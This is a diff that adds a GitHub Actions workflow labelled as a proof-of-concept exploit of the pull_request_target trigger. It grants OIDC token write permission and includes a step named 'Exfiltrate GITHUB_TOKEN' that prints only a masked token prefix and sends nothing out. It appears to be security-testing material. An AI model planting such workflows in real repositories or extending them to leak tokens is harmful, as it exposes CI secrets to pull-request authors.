@@ -1,0 +1,33 @@
+name: PoC - PR Target Exploit
+
+on:
+  pull_request_target:
+
+permissions:
+  id-token: write   # needed for OIDC tokens
+  contents: read    # minimal read access
+
+jobs:
+  poc-exploit:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Show repo context
+        run: |
+          echo "🔎 Actor: $GITHUB_ACTOR"
+          echo "🔎 Event: $GITHUB_EVENT_NAME"
+          echo "🔎 Head Repo: ${{ github.event.pull_request.head.repo.full_name }}"
+          echo "🔎 Base Repo: ${{ github.repository }}"
+
+      - name: List repo files (base repo checkout)
+        uses: actions/checkout@v4
+        with:
+          repository: ${{ github.repository }}
+          ref: ${{ github.event.pull_request.base.ref }}
+      - run: |
+          echo "📂 Files in repo root:"
+          ls -la
+
+      - name: Exfiltrate GITHUB_TOKEN (PoC safe demo)
+        run: |
+          echo "TOKEN starts with: ${GITHUB_TOKEN:0:4}****"
+          echo "✅ Successfully accessed base repo token scope"
